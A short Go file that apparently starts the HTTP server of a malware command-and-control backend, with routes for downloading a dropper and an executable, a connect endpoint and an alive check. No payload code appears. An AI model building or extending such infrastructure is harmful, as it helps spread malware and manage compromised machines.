package api

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"main/src/api/middlewares"
)

func Server() {
	router := gin.Default()

	app, err := BuildApp()
	if err != nil {
		panic("error building the app")
	}

	router.Use(middlewares.LoggerMiddleware(app.Database))
	router.GET("/dropper/download", app.GetDropperController.Get)
	router.GET("/executable/download", app.GetExecutableController.Get)
	router.POST("/executable/connect", app.ConnectController.Connect)
	router.POST("/executable/IsAlive", app.IsAliveController.Check)

	addr := fmt.Sprintf("0.0.0.0:%v", 3001)
	router.Run(addr)
}
